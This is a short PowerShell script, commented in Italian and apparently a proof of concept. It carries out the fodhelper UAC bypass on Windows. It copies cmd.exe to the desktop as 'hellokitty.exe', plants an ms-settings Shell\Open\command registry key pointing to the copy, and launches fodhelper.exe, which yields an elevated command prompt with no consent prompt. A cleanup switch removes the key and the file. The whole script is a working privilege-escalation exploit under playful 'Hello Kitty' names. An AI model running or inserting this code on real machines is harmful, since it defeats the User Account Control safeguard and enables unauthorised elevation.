param (
    [switch]$clear
)

# Ottieni l'username corrente
$username = $env:USERNAME

# Costruisci il percorso di destinazione dinamicamente
$destinationPath = "C:\Users\$username\Desktop\hellokitty.exe"

function helloKittySayHello {
    # Copia cmd.exe e rinominala
    Copy-Item "C:\Windows\System32\cmd.exe" -Destination $destinationPath

    # Crea la struttura del registro
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $destinationPath -Force

    # Esegui il bypass
    Start-Process "fodhelper.exe"
    Write-Output "Hellokitty says Hello! ^.^"
}

function clearRegistry {
    param (
        [string]$destinationPath
    )
    # Rimuovi la struttura del registro
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Write-Output "Registry cleared."

    # Rimuovi hellokitty.exe
    Remove-Item $destinationPath -Force
    Write-Output "Hellokitty says goodbye."
}

if ($clear) {
    clearRegistry -destinationPath $destinationPath
} else {
    helloKittySayHello
}
